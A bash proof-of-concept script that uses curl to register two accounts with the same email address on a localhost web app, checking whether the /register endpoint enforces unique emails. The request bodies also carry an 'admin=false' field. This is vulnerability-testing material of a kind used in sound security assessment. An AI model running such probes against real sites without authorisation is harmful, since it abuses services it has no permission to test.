#!/bin/bash

# POC: Multiple Accounts with Duplicate Email Address
# This script demonstrates that the registration endpoint does not enforce unique email addresses

TARGET_URL="http://localhost:80"
SHARED_EMAIL="duplicate_test_$(date +%s)@unverified.local"

echo "=========================================="
echo "POC: Duplicate Email Account Registration"
echo "=========================================="
echo ""

# Test 1: Create first user with unique email
echo "[*] Creating first user with email: $SHARED_EMAIL"
RESPONSE1=$(curl -s -X POST "$TARGET_URL/register" \
  -d "username=testuser1_$(date +%s)&password=TestPass123&first_name=Test&last_name=One&email=$SHARED_EMAIL&admin=false" \
  -w "\n%{http_code}")

HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)
BODY1=$(echo "$RESPONSE1" | sed '$d')

echo "[+] Response Status: HTTP $HTTP_CODE1"
if [[ "$HTTP_CODE1" == "302" ]] || [[ "$HTTP_CODE1" == "200" ]] || [[ "$HTTP_CODE1" == "201" ]]; then
  echo "[+] First user created successfully"
else
  echo "[-] Failed to create first user (HTTP $HTTP_CODE1)"
  echo "$BODY1"
  exit 1
fi
echo ""

# Test 2: Create second user with the SAME email
echo "[*] Attempting to create second user with SAME email: $SHARED_EMAIL"
RESPONSE2=$(curl -s -X POST "$TARGET_URL/register" \
  -d "username=testuser2_$(date +%s)&password=TestPass123&first_name=Test&last_name=Two&email=$SHARED_EMAIL&admin=false" \
  -w "\n%{http_code}")

HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)
BODY2=$(echo "$RESPONSE2" | sed '$d')

echo "[+] Response Status: HTTP $HTTP_CODE2"
echo "[+] Response Body (first 200 chars): $(echo "$BODY2" | head -c 200)"
echo ""

# Determine if vulnerability exists
if [[ "$HTTP_CODE2" == "302" ]] || [[ "$HTTP_CODE2" == "200" ]] || [[ "$HTTP_CODE2" == "201" ]]; then
  echo "=========================================="
  echo "[!] VULNERABILITY CONFIRMED"
  echo "=========================================="
  echo "[!] Multiple users can be registered with the same email address"
  echo "[!] First registration:  HTTP $HTTP_CODE1 (Success)"
  echo "[!] Second registration: HTTP $HTTP_CODE2 (Success - Should have been rejected!)"
  echo "[!] Email: $SHARED_EMAIL"
  echo "[!] No unique email constraint is enforced"
  echo ""
  exit 0
elif [[ "$HTTP_CODE2" == "409" ]] || [[ "$HTTP_CODE2" == "400" ]] || [[ "$HTTP_CODE2" == "422" ]]; then
  echo "[-] Registration properly rejected with HTTP $HTTP_CODE2"
  echo "[-] Vulnerability appears to be mitigated"
  echo "[-] Response: $(echo "$BODY2" | head -c 200)"
  exit 1
else
  echo "[?] Unexpected response code: HTTP $HTTP_CODE2"
  echo "[?] Response: $(echo "$BODY2" | head -c 200)"
  exit 1
fi